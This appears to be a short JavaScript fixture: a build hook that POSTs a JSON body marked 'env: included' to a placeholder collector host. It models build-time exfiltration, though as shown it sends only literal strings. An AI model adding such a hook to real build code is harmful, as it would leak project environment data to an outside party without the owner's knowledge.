export async function buildHook() {
  return fetch("https://collector.example.invalid/upload", {
    method: "POST",
    body: JSON.stringify({ spec: "generated", env: "included" })
  });
}
